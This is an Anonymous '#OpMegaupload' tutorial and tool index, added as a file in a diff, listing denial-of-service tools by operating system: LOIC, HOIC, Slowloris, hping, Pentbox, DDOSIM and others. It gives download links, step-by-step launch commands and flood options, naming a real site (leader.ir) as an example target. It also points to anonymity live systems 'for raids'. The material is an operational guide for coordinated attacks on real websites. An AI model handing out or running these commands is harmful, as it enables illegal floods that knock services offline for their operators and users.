@@ -1,0 +1,228 @@
+#Anonymous #OpMegaupload #Setup #Tutorials 
+
+						    | W E A P O N S |
+                                                          v.0.1
+                                                          
+			                      n00b tutorial & toolz index
+ 
+
+
+		windows
+---------------------------------------------------------------------------------------------------------
+
+LOIC 
+Download:
+https://github.com/NewEraCracker/LOIC/downloads
+Usage:
+
+HOIC 
+Download:
+http://hoic.99k.org
+
+Pentbox
+http://www.pentbox.net/download-pentbox/
+
+
+Slowloris 
+http://www.multiupload.nl/8KT494DULW
+
+Usage:
+http://pastebin.com/5deha9Ug
+
+
+r-u-dead-yet?
+http://www.hybridsec.com/tools/rudy/
+
+
+hping2
+Download:
+http://www.hping.org/
+hping[2 or 3] [TARGET] -p [PORT] --flood [PACKET TYPE] [OTHER OPTIONS]
+4 moar options take a look @ http://pastebin.com/uM1MjN4b
+
+
+
+for advanced users:
+http://www.thc.org/thc-ssl-dos/
+
+
+
+		linux
+---------------------------------------------------------------------------------------------------------
+
+Pentbox includes :
+TCP Flood DoSer
+TCP Flood AutoDoSer
+Spoofed SYN Flood DoSer [nmap - hping3] <-- best 4 our actions!
+Port scanner
+Honeypot
+PenTBox Secure Instant Messaging
+No Hivemode mode included, must fire manually.
+
+Download:
+http://www.pentbox.net/download-pentbox/  <---
+use it as standalone or better with hping3 (see above)
+
+startin terminal:
+sudo su 
+cd pentbox  
+ruby pentbox.rb 
+
+then type:
+2
+1
+2
+input target example: leader.ir
+input target port : 80
+as default u use random sources but for beeing more effective use it with ur own packages.
+
+
+hping3
+Download:
+http://www.hping.org/hping3-20051105.tar.gz
+
+Usage:
+hping[2 or 3] [TARGET] -p [PORT] --flood [PACKET TYPE] [OTHER OPTIONS]
+4 moar options take a look @ http://pastebin.com/uM1MjN4b
+
+
+slowloris
+http://ha.ckers.org/slowloris/
+
+Download & Install:
+http://ha.ckers.org/slowloris/slowloris.pl
+
+perl -MCPAN -e 'install IO::Socket::INET'
+perl -MCPAN -e 'install IO::Socket::SSL' | http://search.cpan.org/CPAN/authors/id/B/BE/BEHROOZI/IO-Socket-SSL-0.97.tar.gz
+perl -MCPAN -e ’install GetOpt::Long' | http://search.cpan.org/CPAN/authors/id/J/JV/JV/Getopt-Long-2.38.tar.gz
+
+Usage:
+sudo su
+perl slowloris.pl 
+
+examples:
+http ddos  ./slowloris.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 
+https ddos ./slowloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https 
+4 moar options take a look @ http://pastebin.com/uM1MjN4b
+
+
+loiq
+http://sourceforge.net/projects/loiq/files/
+
+
+pyloris
+...can utilize SOCKS proxies and SSL connections, and can target protocols such as HTTP, FTP, SMTP, IMAP, and Telnet.
+
+Download:
+http://sourceforge.net/projects/pyloris/files/pyloris/3.2/pyloris-3.2.tgz/download
+
+
+pyloic (python loic)
+
+Download:
+https://github.com/kenkeiras/pyLOIC/downloads
+
+Usage:
+
+
+r-u-dead-yet?
+Download:
+http://www.hybridsec.com/tools/rudy/
+
+
+DDOSIM
+Info:
+http://stormsecurity.wordpress.com/2009/03/03/application-layer-ddos-simulator/
+Download:
+http://sourceforge.net/projects/ddosim/files/ddosim-0.2.tar.gz/download
+
+Usage:
+./ddosim
+-d IP                   Target IP address
+-p PORT            Target port
+[-k NET]             Source IP from class C network (ex. 10.4.4.0)
+[-i IFNAME]      Output interface name
+[-c COUNT]       Number of connections to establish
+[-w DELAY]       Delay (in milliseconds) between SYN packets
+[-r TYPE]             Request to send after TCP 3-way handshake. TYPE can be HTTP_VALID or HTTP_INVALID or SMTP_EHLO
+[-t NRTHREADS]   Number of threads to use when sending packets (default 1)
+[-n]                       Do not spoof source address (use local address)
+[-v]                       Verbose mode (slower)
+[-h]                       Print this help message
+Examples:
+1. Establish 10 TCP connections from random IP addresses to www  server and send invalid HTTP requests (similar to a DC++ based attack):
+./ddosim   -d 192.168.1.2   -p 80   -c 10   -r HTTP_INVALID  -i eth0
+2. Establish infinite connections from source network 10.4.4.0 to SMTP server and send EHLO requests:
+./ddosim   -d 192.168.1.2   -p 25   -k 10.4.4.0   -c 0   -r SMTP_EHLO  -i eth0
+3. Establish infinite connections at higher speed to www server and make HTTP valid requests:
+./ddosim   -d 192.168.1.2   -p 80   -c 0   -w 0   -t 10   -r HTTP_VALID  -i eth0
+4. Establish infinite TCP connections (without sending a Layer 7 request)  from local address to a POP3 server:
+./ddosim   -d 192.168.1.2   -p 110   -c 0  -i eth0
+
+
+
+for advanced users:
+http://www.thc.org/thc-ssl-dos/
+
+
+
+		MAC
+---------------------------------------------------------------------------------------------------------
+ZAP
+http://www.cowfight.com/cf4/zapattack/
+http://www.cowfight.com/cf4/zapattack/
+
+
+Pentbox
+http://www.pentbox.net/download-pentbox/
+
+
+HowTo use LOIC (or others) on a MAC using MONO:
+https://github.com/NewEraCracker/LOIC/wiki/How-to-run-LOIC-using-Mono
+
+
+
+
+		Operation Systems
+---------------------------------------------------------------------------------------------------------
+http://insurgen.cc/index.php?title=L/i/nux
+http://insurgen.cc/index.php?title=W/i/ndows
+
+
+AnonOS
+http://operationcelebration.net/wiki/AnonOS
+
+
+Annonaceae v.0.0.3 MELCHISEDEK (PROJECT BASIS.) http://www.filefactory.com/file/b513ah8/n/annonaceae.iso
+
+
+AnonOS (Strictly Defensive)
+Rebulding is planned! v0.1 (initial!) http://piratenpad.de/AnonOS-v0-1 Documentation: http://piratepad.net/3540VLXFg7
+
+
+Cherimoya Internet Security LiveCD (for raids)
+v.0.0.1 MELCHISEDEK (Merged from another project) http://ge.tt/3nrRkBf   Documentation: http://piratepad.net/3540VLXFg7
+
+
+TAILS
+https://amnesia.boum.org/
+Download:
+http://dl.amnesia.boum.org/tails/stable/
+
+
+AnonymOS
+http://sourceforge.net/projects/anonym-os/files/Anonym.OS%20Live%20CD/ShmooCon%202006/anonymos-shmoo.iso/download
+
+
+Liberte Linux - persistent,portable USB OS 4 anon communikation
+http://dee.su/liberte
+
+Download:
+http://sourceforge.net/projects/liberte/files/2010.1/liberte-2010.1.zip/download
+
+
+Privatix - persistent,portable USB OS 4 privacy & encryption
+http://download.kommunikationssystem.de/privatix_10.02.07_de.iso
+
+
+to make linux distros portable use http://unetbootin.sourceforge.net/
